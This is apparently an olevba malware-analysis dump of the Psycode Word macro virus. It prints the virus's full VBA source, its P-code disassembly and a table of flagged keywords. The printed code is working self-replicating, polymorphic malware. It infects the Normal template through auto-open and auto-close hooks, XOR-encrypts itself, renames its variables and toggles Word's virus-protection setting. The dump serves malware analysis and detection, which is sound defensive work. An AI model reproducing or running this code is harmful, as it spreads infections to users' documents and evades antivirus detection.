olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psycode
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psycode - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Psycode - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen(): p2: End Sub
Private Sub Document_Close(): p2: End Sub
Private Sub autoclose(): p2: End Sub
Private Sub document_open(): p2: End Sub
Private Sub p2()
'application.ShowVisualBasicEditor = 0
On Error Resume Next
'Options.VirusProtection = 0: application.EnableCancelKey = 0
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
newcode
z = .ProcStartLine("autoexec", 0)
Set dc = ActiveDocument.VBProject.VBComponents.Item(1).codemodule
dc.deletelines 1, dc.countoflines
dc.addfromstring (.Lines(z, z + 13))
.ReplaceLine .ProcStartLine("extra", 0) + 1, "set dc=activedocument"
extra
'NormalTemplate.Save
End With
dc.ReplaceLine dc.ProcStartLine("autoexec", 0), "private a"
With ActiveDocument
'if left(.fullname,2,1)=":" then .SaveAs .FullName
End With
'autoexit
End Sub
Private Sub newcode()
Dim var(1 To 50) As String
Dim newvar(1 To 50) As String
Randomize
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
a = Chr(34)
z = .ProcStartLine("autoexec", 0)
c = (128 + Int(Rnd * 128))
For x = 0 To 3: .ReplaceLine z + x + 1, "tmp = " & a & a: Next x
.ReplaceLine z + 7, "y = y & Chr(Asc(Mid(zzzz, x, 1)) Xor " & c & ")"
s = UCase(.Lines(1, (z + 13)))
'Change the variable names (the name and the length)
';bbbb;jjjj;llll;qqqq;zzzz;
Counter = InStr(s, "'" & Chr(59)): anzvar = 0
For letter = Counter + 2 To Counter + 255 'Line should be longer than 255
If Mid(s, letter, 1) <> Chr(59) Then chiffre = chiffre + Mid(s, letter, 1) Else anzvar = anzvar + 1: var(anzvar) = UCase(chiffre): chiffre = ""
Next letter
'Create new variablenames
For counter1 = 1 To anzvar: For Counter = 1 To Int(Rnd * 3 + 3)
newvar(counter1) = newvar(counter1) + Chr(Int(Rnd() * 25 + 65))
Next Counter: Next counter1
'Change the variablenames
For Counter = 1 To anzvar
letter = InStr(s, var(Counter))
While letter <> 0
s = Left(s, letter - 1) + newvar(Counter) + Mid(s, letter + Len(var(Counter)))
letter = InStr(s, var(Counter))
Wend
Next Counter
.ReplaceLine z + 6, "for x=1 to " & Len(s)
For k = 1 To Len(s)
t = Mid(s, k, 1)
'If Asc(t) < 90 And Asc(t) > 65 Then t = Chr(Asc(t) + Int(Rnd * 2) * 32)
p = p & t
Next k
For x = 1 To Len(p): b = b & Chr(Asc(Mid(p, x, 1)) Xor c):
Next x
For x = 0 To 3
.ReplaceLine z + x + 1, var(x + 1) & "=" & a & Mid(b, (1000 * x) + 1, 1000) & a
Next x
End With
End Sub
Private Sub extra()
Set dc = ActiveDocument
Set dcc = dc.VBProject.VBComponents
For x = 2 To dcc.Count: dcc.Remove dcc.Item(2): Next x
With dcc.Item(1).codemodule
z = .ProcStartLine("autoexec", 0)
For x = z + 5 To z + 13
crap = ""
For y = 0 To 20 + Int(Rnd * 30)
crap = crap & Chr(32 + Int(Rnd * 224))
Next y
.ReplaceLine x, .Lines(x, 1) & "'" & crap
Next x
End With
End Sub
Private Sub autoclose()
newcode
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
.ReplaceLine .ProcStartLine("extra", 0) + 1, "set dc=normaltemplate"
extra
.deletelines 1, .ProcStartLine("autoexec", 0) - 1
End With
'NormalTemplate.Save
End Sub
Private Sub toolsoptions()
Options.VirusProtection = 1
Dialogs(974).Show
Options.VirusProtection = 0
End Sub
Private Sub toolsmacro()
End Sub
Sub viewvbcode()
a = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
System.PrivateProfileString("", a, "a") = "psycode v2.e1 june 1999 thanks 2 VirtualLife"
System.PrivateProfileString("", a, "MRUList") = "a"
End Sub
Private Sub autoexec()
BBBB = ""
JJJJ = ""
LLLL = ""
QQQQ = ""
zzzz = BBBB & JJJJ & LLLL & QQQQ: GoTo Label6
For x = 1 To 3364
y = y & Chr(Asc(Mid(zzzz, x, 1)) Xor 169)
Next x
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
.deletelines 1, .countoflines
.addfromstring y
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Psycode
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 8088 bytes
' Line #0:
' 	FuncDefn (Private Sub autoopen())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Sub autoclose())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub document_open())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub p2())
' Line #5:
' 	QuoteRem 0x0000 0x0025 "application.ShowVisualBasicEditor = 0"
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	QuoteRem 0x0000 0x003C "Options.VirusProtection = 0: application.EnableCancelKey = 0"
' Line #8:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #9:
' 	ArgsCall newcode 0x0000 
' Line #10:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	St z 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set dc 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd countoflines 
' 	Ld dc 
' 	ArgsMemCall deletelines 0x0002 
' Line #13:
' 	Ld z 
' 	Ld z 
' 	LitDI2 0x000D 
' 	Add 
' 	ArgsMemLdWith Lines 0x0002 
' 	Paren 
' 	Ld dc 
' 	ArgsMemCall addfromstring 0x0001 
' Line #14:
' 	LitStr 0x0005 "extra"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0015 "set dc=activedocument"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #15:
' 	ArgsCall extra 0x0000 
' Line #16:
' 	QuoteRem 0x0000 0x0013 "NormalTemplate.Save"
' Line #17:
' 	EndWith 
' Line #18:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	Ld dc 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	LitStr 0x0009 "private a"
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #19:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #20:
' 	QuoteRem 0x0000 0x0031 "if left(.fullname,2,1)=":" then .SaveAs .FullName"
' Line #21:
' 	EndWith 
' Line #22:
' 	QuoteRem 0x0000 0x0008 "autoexit"
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Private Sub newcode())
' Line #25:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	VarDefn var (As String)
' Line #26:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	VarDefn newvar (As String)
' Line #27:
' 	ArgsCall Read 0x0000 
' Line #28:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #29:
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	St a 
' Line #30:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	St z 
' Line #31:
' 	LitDI2 0x0080 
' 	Ld Rnd 
' 	LitDI2 0x0080 
' 	Mul 
' 	FnInt 
' 	Add 
' 	Paren 
' 	St c 
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' 	BoS 0x0000 
' 	Ld z 
' 	Ld x 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0006 "tmp = "
' 	Ld a 
' 	Concat 
' 	Ld a 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld z 
' 	LitDI2 0x0007 
' 	Add 
' 	LitStr 0x0025 "y = y & Chr(Asc(Mid(zzzz, x, 1)) Xor "
' 	Ld c 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld z 
' 	LitDI2 0x000D 
' 	Add 
' 	Paren 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St s 
' Line #35:
' 	QuoteRem 0x0000 0x0033 "Change the variable names (the name and the length)"
' Line #36:
' 	QuoteRem 0x0000 0x001A ";bbbb;jjjj;llll;qqqq;zzzz;"
' Line #37:
' 	Ld s 
' 	LitStr 0x0001 "'"
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr 
' 	St Counter 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St anzvar 
' Line #38:
' 	StartForVariable 
' 	Ld letter 
' 	EndForVariable 
' 	Ld Counter 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld Counter 
' 	LitDI2 0x00FF 
' 	Add 
' 	For 
' 	QuoteRem 0x002A 0x001E "Line should be longer than 255"
' Line #39:
' 	Ld s 
' 	Ld letter 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld chiffre 
' 	Ld s 
' 	Ld letter 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St chiffre 
' 	Else 
' 	BoSImplicit 
' 	Ld anzvar 
' 	LitDI2 0x0001 
' 	Add 
' 	St anzvar 
' 	BoS 0x0000 
' 	Ld chiffre 
' 	ArgsLd UCase 0x0001 
' 	Ld anzvar 
' 	ArgsSt var 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St chiffre 
' 	EndIf 
' Line #40:
' 	StartForVariable 
' 	Ld letter 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	QuoteRem 0x0000 0x0018 "Create new variablenames"
' Line #42:
' 	StartForVariable 
' 	Ld counter1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld anzvar 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Counter 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	FnInt 
' 	For 
' Line #43:
' 	Ld counter1 
' 	ArgsLd newvar 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld counter1 
' 	ArgsSt newvar 0x0001 
' Line #44:
' 	StartForVariable 
' 	Ld Counter 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld counter1 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	QuoteRem 0x0000 0x0018 "Change the variablenames"
' Line #46:
' 	StartForVariable 
' 	Ld Counter 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld anzvar 
' 	For 
' Line #47:
' 	Ld s 
' 	Ld Counter 
' 	ArgsLd var 0x0001 
' 	FnInStr 
' 	St letter 
' Line #48:
' 	Ld letter 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #49:
' 	Ld s 
' 	Ld letter 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld Counter 
' 	ArgsLd newvar 0x0001 
' 	Add 
' 	Ld s 
' 	Ld letter 
' 	Ld Counter 
' 	ArgsLd var 0x0001 
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	St s 
' Line #50:
' 	Ld s 
' 	Ld Counter 
' 	ArgsLd var 0x0001 
' 	FnInStr 
' 	St letter 
' Line #51:
' 	Wend 
' Line #52:
' 	StartForVariable 
' 	Ld Counter 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld z 
' 	LitDI2 0x0006 
' 	Add 
' 	LitStr 0x000B "for x=1 to "
' 	Ld s 
' 	FnLen 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #54:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #55:
' 	Ld s 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St t 
' Line #56:
' 	QuoteRem 0x0000 0x0047 "If Asc(t) < 90 And Asc(t) > 65 Then t = Chr(Asc(t) + Int(Rnd * 2) * 32)"
' Line #57:
' 	Ld p 
' 	Ld t 
' 	Concat 
' 	St p 
' Line #58:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld p 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld B 
' 	Ld p 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St B 
' 	BoS 0x0000 
' Line #60:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #62:
' 	Ld z 
' 	Ld x 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd var 0x0001 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld a 
' 	Concat 
' 	Ld B 
' 	LitDI2 0x03E8 
' 	Ld x 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x03E8 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Ld a 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #63:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	EndWith 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Private Sub extra())
' Line #67:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' Line #68:
' 	SetStmt 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcc 
' Line #69:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld dcc 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld dcc 
' 	ArgsMemLd Item 0x0001 
' 	Ld dcc 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld dcc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #71:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	St z 
' Line #72:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld z 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld z 
' 	LitDI2 0x000D 
' 	Add 
' 	For 
' Line #73:
' 	LitStr 0x0000 ""
' 	St crap 
' Line #74:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	Add 
' 	For 
' Line #75:
' 	Ld crap 
' 	LitDI2 0x0020 
' 	Ld Rnd 
' 	LitDI2 0x00E0 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St crap 
' Line #76:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #77:
' 	Ld x 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld crap 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #78:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndWith 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Private Sub autoclose())
' Line #82:
' 	ArgsCall newcode 0x0000 
' Line #83:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #84:
' 	LitStr 0x0005 "extra"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0015 "set dc=normaltemplate"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #85:
' 	ArgsCall extra 0x0000 
' Line #86:
' 	LitDI2 0x0001 
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #87:
' 	EndWith 
' Line #88:
' 	QuoteRem 0x0000 0x0013 "NormalTemplate.Save"
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Private Sub toolsoptions())
' Line #91:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #92:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #93:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Private Sub toolsmacro())
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub viewvbcode())
' Line #98:
' 	LitStr 0x004B "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
' 	St a 
' Line #99:
' 	LitStr 0x002C "psycode v2.e1 june 1999 thanks 2 VirtualLife"
' 	LitStr 0x0000 ""
' 	Ld a 
' 	LitStr 0x0001 "a"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #100:
' 	LitStr 0x0001 "a"
' 	LitStr 0x0000 ""
' 	Ld a 
' 	LitStr 0x0007 "MRUList"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub autoexec())
' Line #103:
' 	LitStr 0x0000 ""
' 	St BBBB 
' Line #104:
' 	LitStr 0x0000 ""
' 	St JJJJ 
' Line #105:
' 	LitStr 0x0000 ""
' 	St LLLL 
' Line #106:
' 	LitStr 0x0000 ""
' 	St QQQQ 
' Line #107:
' 	Ld BBBB 
' 	Ld JJJJ 
' 	Concat 
' 	Ld LLLL 
' 	Concat 
' 	Ld QQQQ 
' 	Concat 
' 	St zzzz 
' 	BoS 0x0000 
' 	GoTo Label6 
' Line #108:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0D24 
' 	For 
' Line #109:
' 	Ld y 
' 	Ld zzzz 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x00A9 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St y 
' Line #110:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #111:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #112:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #113:
' 	Ld y 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #114:
' 	EndWith 
' Line #115:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

